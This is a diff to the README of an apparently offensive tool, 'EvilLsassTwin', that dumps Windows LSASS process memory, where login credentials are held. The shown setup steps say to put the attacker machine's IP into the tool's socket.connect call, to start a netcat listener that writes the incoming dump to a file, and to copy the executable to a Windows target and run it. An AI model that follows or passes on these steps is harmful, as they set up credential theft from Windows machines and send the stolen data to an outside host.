@@ -28,7 +28,7 @@ _Note: Tool will **not** work against PPL or Credential Guard. Tool also will no
 This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** compatible with Nim 2.0.
 
 1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
-2. Edit line 291 in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number as well. If you do change the port, it needs to be changed within the `EvilLsassTwinServer.nim` file as well.
+2. Edit line ~~291~~ 311 (may have changed, search for `socket.connect("0.0.0.0", Port(6500))`) in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number as well. If you do change the port, it needs to be changed within the `EvilLsassTwinServer.nim` file as well.
 3. Compile the project with `nim build`.
 4. `chmod +x EvilTwinServer && ./EvilTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
 5. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
